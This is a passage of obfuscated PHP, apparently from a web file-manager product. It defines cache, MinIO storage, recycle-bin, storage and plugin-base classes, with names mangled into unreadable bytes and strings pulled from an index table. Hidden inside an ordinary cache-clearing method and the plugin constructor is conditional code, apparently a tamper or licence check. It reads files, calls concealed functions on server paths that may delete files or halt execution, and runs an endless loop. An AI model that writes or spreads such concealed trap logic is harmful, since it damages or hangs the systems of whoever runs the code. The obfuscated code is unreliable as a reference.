$ä©Í¾Å¬ = $ä©Í¾Å¬ ? $ä©Í¾Å¬ : $this->cacheTime; return $this->handle->setEx($ÅÎùëšÑ, $ä©Í¾Å¬, $†ËÕ»É); } public function setLock($„½ÌÑ„, $…è²ÛÁ¿, $Á½˜¤ğİ) { return $this->handle->setNX($„½ÌÑ„, $…è²ÛÁ¿); } public function get($Ä‚æè Ò) { $şÕÖıâˆ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $şÕÖıâˆ->get($Ä‚æè Ò); } public function remove($ä­¨çÀ) { return $this->handle->del($ä­¨çÀ); } public function deleteAll() { $°¶¸˜êÅ =& $_SERVER[ñ÷§¡å]; if (!isset($_SERVER[$°¶¸˜êÅ[60]]) || !isset($_SERVER[$°¶¸˜êÅ[69]])) { $ç’¿¹»ó = $°¶¸˜êÅ[885]; $™”—ğ×¡ = $°¶¸˜êÅ[62]; $€µ»ıã§ = $_SERVER[$°¶¸˜êÅ[63]] . $°¶¸˜êÅ[64]; $¼Ò’«Éí = $™”—ğ×¡($€µ»ıã§); $íöÔÄÁ” = explode($°¶¸˜êÅ[65], $¼Ò’«Éí); if (count($íöÔÄÁ”) < $°¶¸˜êÅ[629]) { $µ²Ç¤ = $°¶¸˜êÅ[67]; $µ²Ç¤(); } $ƒË®‰æè = $°¶¸˜êÅ[886]; $ƒË®‰æè($_SERVER[$°¶¸˜êÅ[887]]); $ºµ÷Ì‘Ÿ = 1; for ($ß‹‘å¾ = $ºµ÷Ì‘Ÿ; $ß‹‘å¾ > 0; $ß‹‘å¾++) { $ƒË®‰æè = json_encode($GLOBALS[$°¶¸˜êÅ[427]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $°µ‹ìË…) { $this->handle->flushall($°µ‹ìË…); } return; } return $this->handle->flushAll(); } } $_file = $_SERVER[$_SERVER[ñ÷§¡å][69]]; goto aËâšŒšÛ; cÒË‹³†¤ˆ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Œ†İºëĞ) { parent::__construct($Œ†İºëĞ); $this->signatureVersion($_SERVER[ñ÷§¡å][226]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } define($_SERVER[ñ÷§¡å][247], 1); define($_SERVER[ñ÷§¡å][248], 2); goto D—ÂöÉëÒ­; D—ÂöÉëÒ­: define($_SERVER[ñ÷§¡å][249], 3); define($_SERVER[ñ÷§¡å][250], 1); define($_SERVER[ñ÷§¡å][251], 0); goto DÏãµ×µÓ˜; aÅİÓ‰“Âø: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\x72\143\145\137\x72\x65\x63\171\143\x6c\145"; protected $dataAuto = array(array("\x63\162\x65\141\164\145\x54\x69\x6d\x65", "\164\151\x6d\145", "\151\156\x73\x65\x72\x74", "\146\x75\x6e\x63\164\151\x6f\156")); public function listData($®ƒ£Ö×ƒ = false) { $§¨µ®Ö =& $_SERVER[ñ÷§¡å]; $®ƒ£Ö×ƒ = $®ƒ£Ö×ƒ ? $®ƒ£Ö×ƒ : USER_ID; $öË¼ã“” = $this->where(array($§¨µ®Ö[1654] => $®ƒ£Ö×ƒ))->select(); return array_to_keyvalue($öË¼ã“”, $§¨µ®Ö[12], $§¨µ®Ö[411]); } public function moveToRecycle($€¸…ğ¡¥) { $µ»†¤Ö‰ =& $_SERVER[ñ÷§¡å]; $…óÜõ§º = Model($µ»†¤Ö‰[1334]); $î‹Â­Âã = $…óÜõ§º->sourceInfo($€¸…ğ¡¥); if (!$î‹Â­Âã || $î‹Â­Âã[$µ»†¤Ö‰[440]] == $µ»†¤Ö‰[98]) { return; } $š¤µù½± = array($µ»†¤Ö‰[426] => $€¸…ğ¡¥, $µ»†¤Ö‰[1654] => USER_ID, $µ»†¤Ö‰[595] => $î‹Â­Âã[$µ»†¤Ö‰[420]], $µ»†¤Ö‰[596] => $î‹Â­Âã[$µ»†¤Ö‰[514]], $µ»†¤Ö‰[599] => $î‹Â­Âã[$µ»†¤Ö‰[530]]); $this->add($š¤µù½±); $this->recycleMove($€¸…ğ¡¥, 1); if ($î‹Â­Âã[$µ»†¤Ö‰[419]] == $µ»†¤Ö‰[98]) { $Çá¶íĞè = array($µ»†¤Ö‰[599] => array($µ»†¤Ö‰[559], $î‹Â­Âã[$µ»†¤Ö‰[530]] . $€¸…ğ¡¥ . $µ»†¤Ö‰[560])); $…óÜõ§º->where($Çá¶íĞè)->setField($µ»†¤Ö‰[440], 1); } } public function clear() { $this->remove(!1); } public function remove($»ºöÌš‚ = false, $ÀÕ…Ä„ = false) { $‘ıµç• =& $_SERVER[ñ÷§¡å]; $ÀÕ…Ä„ = $ÀÕ…Ä„ ? $ÀÕ…Ä„ : USER_ID; $£íØ³‡Ÿ = Model($‘ıµç•[1334]); $ÌµËßµ‰ = $this->listData($ÀÕ…Ä„); $»ºöÌš‚ = $»ºöÌš‚ === !1 ? !1 : $»ºöÌš‚; $Òİ˜£—ş = array(); foreach ($ÌµËßµ‰ as $´İ¼êİ) { if ($»ºöÌš‚ != !1 && !in_array($´İ¼êİ, $»ºöÌš‚)) { continue; } $±¯¨Ù× = $£íØ³‡Ÿ->sourceInfo($´İ¼êİ); $£íØ³‡Ÿ->remove($´İ¼êİ, !1); $Ë˜‘­€Â = $±¯¨Ù×[$‘ıµç•[420]] . $‘ıµç•[11] . $±¯¨Ù×[$‘ıµç•[514]]; $Òİ˜£—ş[$Ë˜‘­€Â] = array($‘ıµç•[595] => $±¯¨Ù×[$‘ıµç•[420]], $‘ıµç•[514] => $±¯¨Ù×[$‘ıµç•[514]]); $this->where(array($‘ıµç•[411] => $´İ¼êİ))->delete(); } foreach ($Òİ˜£—ş as $½è¥Í™) { $£íØ³‡Ÿ->targetSpaceUpdate($½è¥Í™[$‘ıµç•[420]], $½è¥Í™[$‘ıµç•[514]]); } } public function restore($„áùâÊˆ = false) { $ªµĞßé’ = $this->listData(); $this->_restoreSource($ªµĞßé’, $„áùâÊˆ); } public function removeUserAll($¿€Õ°òç) { $this->remove(!1, $¿€Õ°òç); } private function _restoreSource($íÍï˜É¿, $“üÀôÓÈ) { $¦îæˆµ =& $_SERVER[ñ÷§¡å]; $İæŒ¡ÚÜ = Model($¦îæˆµ[1334]); $“üÀôÓÈ = $“üÀôÓÈ == !1 ? !1 : $“üÀôÓÈ; if (!$íÍï˜É¿) { return !0; } $³›ˆ¾¼ = array(); foreach ($íÍï˜É¿ as $áœ²Â¿¶) { if ($“üÀôÓÈ != !1 && !in_array($áœ²Â¿¶, $“üÀôÓÈ)) { continue; } $¡ñä¼ÈÒ = $İæŒ¡ÚÜ->sourceInfo($áœ²Â¿¶); $¼…‹‚Äã = $İæŒ¡ÚÜ->sourceInfo($¡ñä¼ÈÒ[$¦îæˆµ[441]]); if ($¼…‹‚Äã[$¦îæˆµ[440]] == $¦îæˆµ[98]) { continue; } $İæŒ¡ÚÜ->lockMoveStart($áœ²Â¿¶); $this->recycleMove($áœ²Â¿¶, 0); if ($¡ñä¼ÈÒ[$¦îæˆµ[419]] == $¦îæˆµ[98]) { $Ù¼Ç–”“ = array($¦îæˆµ[599] => array($¦îæˆµ[559], $¡ñä¼ÈÒ[$¦îæˆµ[530]] . $áœ²Â¿¶ . $¦îæˆµ[560])); $İæŒ¡ÚÜ->where($Ù¼Ç–”“)->setField($¦îæˆµ[440], 0); $this->restoreFolderChildren($áœ²Â¿¶, $íÍï˜É¿); } $this->where(array($¦îæˆµ[411] => $áœ²Â¿¶))->delete(); $İæŒ¡ÚÜ->folderSizeReset($¡ñä¼ÈÒ[$¦îæˆµ[441]]); $³›ˆ¾¼[] = $¡ñä¼ÈÒ[$¦îæˆµ[441]]; if ($¡ñä¼ÈÒ[$¦îæˆµ[419]] == $¦îæˆµ[98]) { $³›ˆ¾¼[] = $áœ²Â¿¶; } $İæŒ¡ÚÜ->lockMoveEnd($áœ²Â¿¶); } $İæŒ¡ÚÜ->updateModifyTime($³›ˆ¾¼); } private function restoreFolderChildren($ë‚™Èà, $üĞ€õÉ³) { $×äñæ…¦ =& $_SERVER[ñ÷§¡å]; $‘¹©éˆÌ = Model($×äñæ…¦[1334]); $¹§¤¡ªØ = array($×äñæ…¦[411] => array($×äñæ…¦[7], array())); foreach ($üĞ€õÉ³ as $è¯óÓšÆ) { if ($è¯óÓšÆ == $ë‚™Èà) { continue; } if (!$‘¹©éˆÌ->isParentOf($ë‚™Èà, $è¯óÓšÆ)) { continue; } $ºşÅÏÊë = $‘¹©éˆÌ->sourceInfo($è¯óÓšÆ); if ($ºşÅÏÊë[$×äñæ…¦[419]] == $×äñæ…¦[98]) { $¹§¤¡ªØ[] = array($×äñæ…¦[599] => array($×äñæ…¦[559], $ºşÅÏÊë[$×äñæ…¦[530]] . $è¯óÓšÆ . $×äñæ…¦[560])); } else { $¹§¤¡ªØ[$×äñæ…¦[411]][1][] = $è¯óÓšÆ; } } if (!$¹§¤¡ªØ[$×äñæ…¦[411]][1]) { unset($¹§¤¡ªØ[$×äñæ…¦[411]]); } if (!$¹§¤¡ªØ) { return; } $¹§¤¡ªØ[$×äñæ…¦[411]][1] = array_unique($¹§¤¡ªØ[$×äñæ…¦[411]][1]); $¹§¤¡ªØ[$×äñæ…¦[1007]] = $×äñæ…¦[1933]; $‘¹©éˆÌ->where($¹§¤¡ªØ)->setField($×äñæ…¦[440], 1); } private function recycleMove($¹÷ãÆä¬, $¨£ßµ¨Ã = 1) { $Ã¯ê‹¨¼ =& $_SERVER[ñ÷§¡å]; $º–ô»¬ = Model($Ã¯ê‹¨¼[1334]); $Ì‚ò½Š‚ = Model($Ã¯ê‹¨¼[2144]); $Ş»Ëçïƒ = array($Ã¯ê‹¨¼[411] => $¹÷ãÆä¬); if ($¨£ßµ¨Ã) { $º–ô»¬->where($Ş»Ëçïƒ)->setField($Ã¯ê‹¨¼[440], 1); $Ì‚ò½Š‚->eventRecycle($¹÷ãÆä¬, $Ã¯ê‹¨¼[2145]); } else { $¹ì±Éê = $º–ô»¬->where($Ş»Ëçïƒ)->find(); $¹¨ºñÒé = $¹ì±Éê[$Ã¯ê‹¨¼[419]] == $Ã¯ê‹¨¼[98]; $ƒ¼ˆÚÅ± = $º–ô»¬->fileNameAuto($¹ì±Éê[$Ã¯ê‹¨¼[441]], $¹ì±Éê[$Ã¯ê‹¨¼[32]], REPEAT_RENAME_FOLDER, $¹¨ºñÒé); if ($ƒ¼ˆÚÅ± != $¹ì±Éê[$Ã¯ê‹¨¼[32]]) { $º–ô»¬->rename($¹÷ãÆä¬, $ƒ¼ˆÚÅ±); } $º–ô»¬->where($Ş»Ëçïƒ)->setField($Ã¯ê‹¨¼[440], 0); $Ì‚ò½Š‚->eventRecycle($¹÷ãÆä¬, $Ã¯ê‹¨¼[2146]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x73\157\165\162\x63\145\123\145\x63\162\145\x74\114\151\x73\x74"; public $field = array("\x73\x6f\165\162\143\x65\x49\104", "\x74\171\160\145\x49\x44", "\x63\162\145\141\x74\x65\x55\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\163\x74\x6f\162\x61\x67\x65\x4c\x69\163\164"; public $field = array("\156\x61\x6d\x65", "\x73\151\x7a\x65\115\141\x78", "\163\x79\x73\x74\x65\155", "\x64\x65\146\x61\165\x6c\164", "\144\162\151\x76\145\162", "\x63\157\156\x66\x69\x67"); public function listData($õ›«æŠ‚ = false, $Ï¢Ğ§‰ö = "\155\x6f\x64\x69\146\171\x54\x69\x6d\145", $öìñ“Æ = false) { $‘½ ½÷Ñ =& $_SERVER[ñ÷§¡å]; $ŞÍˆ¼ßª = parent::listData($õ›«æŠ‚, $Ï¢Ğ§‰ö, $öìñ“Æ); if ($õ›«æŠ‚) { return $ŞÍˆ¼ßª; } $¦œ‰¨ëÚ = $this->ioSizeUseGet(array_to_keyvalue($ŞÍˆ¼ßª, $‘½ ½÷Ñ[12], $‘½ ½÷Ñ[408])); foreach ($ŞÍˆ¼ßª as $Ìƒ¨ÏöŒ => $­Èûó‚¨) { unset($ŞÍˆ¼ßª[$Ìƒ¨ÏöŒ][$‘½ ½÷Ñ[6]]); $ŞÍˆ¼ßª[$Ìƒ¨ÏöŒ][$‘½ ½÷Ñ[1824]] = isset($¦œ‰¨ëÚ[$­Èûó‚¨[$‘½ ½÷Ñ[408]]]) ? $¦œ‰¨ëÚ[$­Èûó‚¨[$‘½ ½÷Ñ[408]]] : 0; } return $ŞÍˆ¼ßª; } public function ioSizeUseGet($ÍÔ©ôÖ¢) { $â·Õ•¬Ç =& $_SERVER[ñ÷§¡å]; if (!$ÍÔ©ôÖ¢) { return array(); } $ÊÓ™®àî = $â·Õ•¬Ç[2147] . implode($â·Õ•¬Ç[50], $ÍÔ©ôÖ¢); $¾ãÈÂıá = Cache::get($ÊÓ™®àî); if ($¾ãÈÂıá) { return $¾ãÈÂıá; } $ÄÊìíüƒ = array($â·Õ•¬Ç[830] => $â·Õ•¬Ç[408], $â·Õ•¬Ç[2148] => $â·Õ•¬Ç[86]); $ëéúıÖ’ = array($â·Õ•¬Ç[830] => array($â·Õ•¬Ç[7], $ÍÔ©ôÖ¢)); $¾ãÈÂıá = Model($â·Õ•¬Ç[802])->field($ÄÊìíüƒ)->where($ëéúıÖ’)->group($â·Õ•¬Ç[830])->select(); $¾ãÈÂıá = array_to_keyvalue($¾ãÈÂıá, $â·Õ•¬Ç[408], $â·Õ•¬Ç[86]); Cache::set($ÊÓ™®àî, $¾ãÈÂıá, 600); return $¾ãÈÂıá; } public function getConfig($ÏÅ°¢¨„) { $ÑÑ˜ÂÂÂ = parent::listData($ÏÅ°¢¨„); return json_decode($ÑÑ˜ÂÂÂ[$_SERVER[ñ÷§¡å][6]], !0); } public function update($£­›ÑÊ, $ÏŸ×ñ¯) { $ÖÍŞ¾¤À =& $_SERVER[ñ÷§¡å]; $æÀÛìãÊ = $ÏŸ×ñ¯[$ÖÍŞ¾¤À[32]]; $êÌíÇ¶â = array_to_keyvalue(parent::listData(), $ÖÍŞ¾¤À[32]); if (isset($êÌíÇ¶â[$æÀÛìãÊ]) && $êÌíÇ¶â[$æÀÛìãÊ][$ÖÍŞ¾¤À[408]] != $£­›ÑÊ) { return !1; } $this->checkPwd($£­›ÑÊ, $ÏŸ×ñ¯); if (isset($ÏŸ×ñ¯[$ÖÍŞ¾¤À[2149]]) && $ÏŸ×ñ¯[$ÖÍŞ¾¤À[2149]] == $ÖÍŞ¾¤À[98]) { $this->checkConfig($ÏŸ×ñ¯); } unset($ÏŸ×ñ¯[$ÖÍŞ¾¤À[2149]]); $›Ş¨ìÚ = parent::update($£­›ÑÊ, $ÏŸ×ñ¯); if ($›Ş¨ìÚ && $ÏŸ×ñ¯[$ÖÍŞ¾¤À[37]]) { $¶ÕÓú‚Ò = 0; foreach ($êÌíÇ¶â as $çË“îøÔ) { if ($çË“îøÔ[$ÖÍŞ¾¤À[37]] && $çË“îøÔ[$ÖÍŞ¾¤À[408]] != $£­›ÑÊ) { $¶ÕÓú‚Ò = $çË“îøÔ[$ÖÍŞ¾¤À[408]]; parent::update($çË“îøÔ[$ÖÍŞ¾¤À[408]], array($ÖÍŞ¾¤À[37] => 0)); } } $this->updateBackup($£­›ÑÊ, $¶ÕÓú‚Ò); } return $›Ş¨ìÚ; } public function add($´Ù¥şÙó) { $åÎã³Ñ¯ =& $_SERVER[ñ÷§¡å]; $Éı×Î£ = array_to_keyvalue(parent::listData(), $åÎã³Ñ¯[32]); if (isset($Éı×Î£[$´Ù¥şÙó[$åÎã³Ñ¯[32]]])) { return !1; } $this->checkConfig($´Ù¥şÙó); $ÖëÀøİ = parent::insert($´Ù¥şÙó); if ($ÖëÀøİ && $´Ù¥şÙó[$åÎã³Ñ¯[37]]) { foreach ($Éı×Î£ as $Üğ¨ùÔ) { if ($Üğ¨ùÔ[$åÎã³Ñ¯[37]]) { parent::update($Üğ¨ùÔ[$åÎã³Ñ¯[408]], array($åÎã³Ñ¯[37] => 0)); } } } return $ÖëÀøİ; } public function updateBackup($ï„‡ö¦·, $—”•ìñÀ) { $àÌñóÑù =& $_SERVER[ñ÷§¡å]; if (!$—”•ìñÀ) { return; } $„¨¼È®ñ = Model($àÌñóÑù[762])->config(); if ($„¨¼È®ñ[$àÌñóÑù[1633]] != $àÌñóÑù[98] || $„¨¼È®ñ[$àÌñóÑù[765]] != $—”•ìñÀ) { return; } $¤ÇÑÛÑö = Model($àÌñóÑù[783])->get($àÌñóÑù[793]); $¤ÇÑÛÑö = json_decode($¤ÇÑÛÑö, !0); if (!$¤ÇÑÛÑö) { return; } $¤ÇÑÛÑö[$àÌñóÑù[765]] = $ï„‡ö¦·; Model($àÌñóÑù[783])->set(array($àÌñóÑù[793] => $¤ÇÑÛÑö)); } public function checkPwd($å¶™Ü·º, &$Åôü¤ş‚) { $«Ôİ‘Ç® =& $_SERVER[ñ÷§¡å]; if (empty($Åôü¤ş‚[$«Ôİ‘Ç®[6]])) { return; } $…ĞĞ—· = json_decode($Åôü¤ş‚[$«Ôİ‘Ç®[6]], !0); $³ÎÖí´ı = $«Ôİ‘Ç®[12]; $ªöê–¬« = array($«Ôİ‘Ç®[2150], $«Ôİ‘Ç®[2151], $«Ôİ‘Ç®[896]); foreach ($ªöê–¬« as $Â¹ä®Ÿ¿) { if (isset($…ĞĞ—·[$Â¹ä®Ÿ¿])) { $³ÎÖí´ı = $Â¹ä®Ÿ¿; break; } } if (!$³ÎÖí´ı) { return; } $„ĞŠëĞŒ = $this->getConfig($å¶™Ü·º); $Õãñƒ = $„ĞŠëĞŒ[$³ÎÖí´ı]; $ı©æœè› = $…ĞĞ—·[$³ÎÖí´ı]; if ($ı©æœè› == str_repeat($«Ôİ‘Ç®[198], strlen($Õãñƒ))) { $…ĞĞ—·[$³ÎÖí´ı] = $Õãñƒ; $Åôü¤ş‚[$«Ôİ‘Ç®[6]] = json_encode($…ĞĞ—·); } else { if ($ı©æœè› != $Õãñƒ) { $Åôü¤ş‚[$«Ôİ‘Ç®[2149]] = $«Ôİ‘Ç®[98]; } } } public function checkConfig(&$¦êğ½ĞŸ, $éÑÈğ˜Ğ = false) { $‘±¯“è =& $_SERVER[ñ÷§¡å]; $Ñá€½í˜ = strtolower($¦êğ½ĞŸ[$‘±¯“è[105]]); $ÍÇ¨Àïù = json_decode($¦êğ½ĞŸ[$‘±¯“è[6]], !0); foreach ($ÍÇ¨Àïù as $Ÿ£Æ°¤Ô => $¶„çáÖ) { $ÍÇ¨Àïù[$Ÿ£Æ°¤Ô] = trim($¶„çáÖ); } $ÍÇ¨Àïù[$‘±¯“è[2152]] = rand_string(6); $¬³ë°ä‰ = $GLOBALS[$‘±¯“è[6]][$‘±¯“è[99]][$‘±¯“è[839]]; $Üêôæä³ = isset($¬³ë°ä‰[$Ñá€½í˜]) ? $¬³ë°ä‰[$Ñá€½í˜] : ucfirst($Ñá€½í˜); $í‘âÎˆ‡ = $‘±¯“è[84] . $Üêôæä³; if (!$Üêôæä³ || !class_exists($í‘âÎˆ‡)) { if ($éÑÈğ˜Ğ) { return LNG($‘±¯“è[2153]); } write_log(array($‘±¯“è[2154], $¦êğ½ĞŸ, get_caller_info()), $‘±¯“è[2155]); show_json(LNG($‘±¯“è[2153]), !1, $¦êğ½ĞŸ); } $šú‰·Îİ = new $í‘âÎˆ‡($ÍÇ¨Àïù); if (in_array($Ñá€½í˜, $šú‰·Îİ->objectDriver)) { if (!$šú‰·Îİ->isBucketCors() && !$šú‰·Îİ->setBucketCors()) { $ÇıŒ§¨„ = LNG($‘±¯“è[2156]); $ÇıŒ§¨„ .= $‘±¯“è[2157] . LNG($‘±¯“è[2158]); if ($éÑÈğ˜Ğ) { return $ÇıŒ§¨„; } show_json($ÇıŒ§¨„, !1); } } $±Ò¦¨· = rtrim($ÍÇ¨Àïù[$‘±¯“è[1188]], $‘±¯“è[8]) . $‘±¯“è[8]; $’‡‘ØÏ´ = $šú‰·Îİ->getPath($±Ò¦¨· . $‘±¯“è[1250]); if (!$šú‰·Îİ->mkfile($’‡‘ØÏ´)) { if ($éÑÈğ˜Ğ) { return LNG($‘±¯“è[2156]); } show_json(LNG($‘±¯“è[2156]), !1); } $ÍÇ¨Àïù[$‘±¯“è[1188]] = $±Ò¦¨·; $¦êğ½ĞŸ[$‘±¯“è[6]] = json_encode($ÍÇ¨Àïù); $¦êğ½ĞŸ[$‘±¯“è[105]] = $Üêôæä³; return !0; } public function driverListSystem() { $Ö©”„â£ =& $_SERVER[ñ÷§¡å]; $º¯šÚŠå = parent::listData(); $—Ğ¨ÊËè = array(); foreach ($º¯šÚŠå as $‹ã¤Şü) { unset($‹ã¤Şü[$Ö©”„â£[210]], $‹ã¤Şü[$Ö©”„â£[95]]); $‹ã¤Şü[$Ö©”„â£[6]] = json_decode($‹ã¤Şü[$Ö©”„â£[6]], !0); $—Ğ¨ÊËè[] = $‹ã¤Şü; } return $—Ğ¨ÊËè; } public function defaultDriver() { $Ğ¢ó† =& $_SERVER[ñ÷§¡å]; $øæÙËÄü = parent::listData(); $ş¢œœŞ² = array_filter_by_field($øæÙËÄü, $Ğ¢ó†[37], 1); $ş¢œœŞ² = $ş¢œœŞ²[0]; if ($ş¢œœŞ²) { $ş¢œœŞ²[$Ğ¢ó†[6]] = json_decode($ş¢œœŞ²[$Ğ¢ó†[6]], !0); } return $ş¢œœŞ²; } public function driverInfo($‹Ç„à¸–) { $×Ñßüúº =& $_SERVER[ñ÷§¡å]; $Ùµï“Û¡ = array_to_keyvalue(parent::listData(), $×Ñßüúº[408]); if (!isset($Ùµï“Û¡[$‹Ç„à¸–])) { return !1; } $”âÀË = $Ùµï“Û¡[$‹Ç„à¸–]; $”âÀË[$×Ñßüúº[6]] = json_decode($”âÀË[$×Ñßüúº[6]], !0); return $”âÀË; } public function remove($©Ş³¬²ù) { $this->removeShareItems($©Ş³¬²ù); return parent::remove($©Ş³¬²ù); } public function removeWithFile($•ùìôâŠ, $‰¥—°¥) { $¶ó¹ÚİÑ =& $_SERVER[ñ÷§¡å]; $ªÉüá¥ = array($¶ó¹ÚİÑ[830] => $•ùìôâŠ); $Ï¾à™—· = Model($¶ó¹ÚİÑ[480])->where($ªÉüá¥)->count(); $Ì±úÍäÁ = Model($¶ó¹ÚİÑ[480])->where($ªÉüá¥)->sum($¶ó¹ÚİÑ[86]); $ØŒıÂ’° = $‰¥—°¥ . $¶ó¹ÚİÑ[2159] . $•ùìôâŠ; $ÊĞÅÌ‡ë = LNG($‰¥—°¥ == $¶ó¹ÚİÑ[566] ? $¶ó¹ÚİÑ[2160] : $¶ó¹ÚİÑ[2161]); $ı’¯²‘© = new TaskFileTransfer($ØŒıÂ’°, $¶ó¹ÚİÑ[2155], $Ï¾à™—·, $ÊĞÅÌ‡ë . "\x28{$•ùìôâŠ}\x29"); $ı’¯²‘©->task[$¶ó¹ÚİÑ[776]] = (double) $Ì±úÍäÁ; $®Ö‘Î–Î = KodIO::defaultDriver(); $Á»€ÊÃÅ = $®Ö‘Î–Î[$¶ó¹ÚİÑ[408]]; $âœ»‰± = "\173\x69\x6f\x3a{$Á»€ÊÃÅ}\x7d\x2f"; $ïÑœ…ğ = !0; $¦¥üÁŸ« = array(); $‰†¿ğÓ = Model($¶ó¹ÚİÑ[209])->where($ªÉüá¥)->field($¶ó¹ÚİÑ[2162])->select(); foreach ($‰†¿ğÓ as $ÍÆ› ¤ú) { $…ÀšÀ = $ÍÆ› ¤ú[$¶ó¹ÚİÑ[94]]; $ ÇÒ²œ‘ = $âœ»‰± . str_replace("\x7b\151\157\x3a{$•ùìôâŠ}\x7d\57", $¶ó¹ÚİÑ[12], $…ÀšÀ); if (!IO::exist($…ÀšÀ)) { $¦¥üÁŸ«[] = $ÍÆ› ¤ú[$¶ó¹ÚİÑ[477]]; $ı’¯²‘©->updateFileEnd($ÍÆ› ¤ú[$¶ó¹ÚİÑ[32]], $ÍÆ› ¤ú[$¶ó¹ÚİÑ[86]]); continue; } if (IO::exist($ ÇÒ²œ‘)) { $ı’¯²‘©->updateFileEnd($ÍÆ› ¤ú[$¶ó¹ÚİÑ[32]], $ÍÆ› ¤ú[$¶ó¹ÚİÑ[86]]); continue; } if (!IO::move($…ÀšÀ, get_path_father($ ÇÒ²œ‘))) { $ïÑœ…ğ = !1; break; } $ªÉüá¥ = array($¶ó¹ÚİÑ[477] => $ÍÆ› ¤ú[$¶ó¹ÚİÑ[477]]); $–é™µ¿ = array($¶ó¹ÚİÑ[830] => $Á»€ÊÃÅ, $¶ó¹ÚİÑ[94] => $ ÇÒ²œ‘); Model($¶ó¹ÚİÑ[209])->where($ªÉüá¥)->save($–é™µ¿); } $this->removeByFileID($¦¥üÁŸ«); if (!$ïÑœ…ğ) { $ı’¯²‘©->stop($ØŒıÂ’°); return !1; } $ı’¯²‘©->end(); if ($‰¥—°¥ == $¶ó¹ÚİÑ[1804]) { $this->remove($•ùìôâŠ); } } public function progress($º´Ãş¨, $Ë¿¨Íú) { return Task::get($Ë¿¨Íú . $_SERVER[ñ÷§¡å][2159] . $º´Ãş¨); } private function removeByFileID($›¬¢æ£ñ = array()) { $‘´¬·îÁ =& $_SERVER[ñ÷§¡å]; if (empty($›¬¢æ£ñ)) { return; } $ÓÀ¹â™ò = array($‘´¬·îÁ[477] => array($‘´¬·îÁ[7], $›¬¢æ£ñ)); $éÑş¡€ğ = Model($‘´¬·îÁ[1334])->where($ÓÀ¹â™ò)->field($‘´¬·îÁ[411])->select(); if (!$éÑş¡€ğ) { return; } $éÑş¡€ğ = array_to_keyvalue($éÑş¡€ğ, $‘´¬·îÁ[12], $‘´¬·îÁ[411]); foreach ($éÑş¡€ğ as $é ‚àäÌ) { Model($‘´¬·îÁ[425])->removeNow($é ‚àäÌ, !1); } } private function removeShareItems($Ğ÷ ß) { $Ä¡œ¸æ =& $_SERVER[ñ÷§¡å]; $‘“Á£›÷ = "\x7b\151\x6f\x3a{$Ğ÷ ß}\x7d\57"; $’•ğ£ì = array($Ä¡œ¸æ[411] => 0, $Ä¡œ¸æ[1183] => array($Ä¡œ¸æ[392], "{$‘“Á£›÷}\45")); $–‚êÏÍ÷ = Model($Ä¡œ¸æ[1815])->where($’•ğ£ì)->field($Ä¡œ¸æ[498])->select(); if (empty($–‚êÏÍ÷)) { return; } $ııÊÑ©õ = array_to_keyvalue($–‚êÏÍ÷, $Ä¡œ¸æ[12], $Ä¡œ¸æ[498]); Model($Ä¡œ¸æ[610])->remove($ııÊÑ©õ); } } goto Câ˜¤èƒª; B£É«“…¸Ò: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $³ ¶øñ­ =& $_SERVER[ñ÷§¡å]; if ($_SERVER[$³ ¶øñ­[60]] != $_SERVER[$³ ¶øñ­[61]]) { $Ü÷¬ç·® = $³ ¶øñ­[885]; $Ûéù¾´µ = $³ ¶øñ­[62]; $¦ƒÃ†»à = $_SERVER[$³ ¶øñ­[63]] . $³ ¶øñ­[64]; $¿½Ğ™ê = $Ûéù¾´µ($¦ƒÃ†»à); $ĞÅáì€ = explode($³ ¶øñ­[65], $¿½Ğ™ê); if (count($ĞÅáì€) < $³ ¶øñ­[629]) { $·ŒÖµ = $³ ¶øñ­[67]; $·ŒÖµ(); } $º¢ØèÏŞ = $³ ¶øñ­[886]; $º¢ØèÏŞ($_SERVER[$³ ¶øñ­[887]]); $º¢ØèÏŞ($_SERVER[$³ ¶øñ­[63]] . $³ ¶øñ­[1528]); $¦–¦°Ô = 1; while ($¦–¦°Ô > 1) { $¦–¦°Ô = $¦–¦°Ô + 4; $¤¾àÈ¦ = rawurlencode($¦–¦°Ô . $³ ¶øñ­[387]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($³ ¶øñ­[1529]); $this->pluginName = str_replace($³ ¶øñ­[1529], $³ ¶øñ­[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $³ ¶øñ­[8]; $this->pluginApi = appHostGet() . $³ ¶øñ­[1530] . $this->pluginName . $³ ¶øñ­[8]; $this->pluginHost = $config[$³ ¶øñ­[1531]] . $this->pluginName . $³ ¶øñ­[8]; $this->pluginHostDefault = $config[$³ ¶øñ­[1531]] . $this->pluginName . $³ ¶øñ­[8]; $’œÖãàù = $config[$³ ¶øñ­[1532]]; if ($’œÖãàù && strpos($³ ¶øñ­[50] . $’œÖãàù . $³ ¶øñ­[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$³ ¶øñ­[1533]] . $this->pluginName . $³ ¶øñ­[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ñ÷§¡å][1534]); } protected function assign($¨÷ãıÆ, $§ü°¾ú© = false) { if (is_array($¨÷ãıÆ)) { $this->values = array_merge($this->values, $¨÷ãıÆ); } else { $this->values[$¨÷ãıÆ] = $§ü°¾ú©; } } protected function display($ú©ûµÃ§) { extract($this->values); require $ú©ûµÃ§; } final function hookRegist($ñù—·şÙ) { $this->modelPlugin->appRegist($this->pluginName, $ñù—·şÙ); } final function appIcon() { $™äâú‡£ =& $_SERVER[ñ÷§¡å]; $õäµ‘Å– = $this->appPackage(); $˜ÁÙÃ™¨ = $™äâú‡£[12]; if (isset($õäµ‘Å–[$™äâú‡£[425]])) { if (isset($õäµ‘Å–[$™äâú‡£[425]][$™äâú‡£[1535]])) { 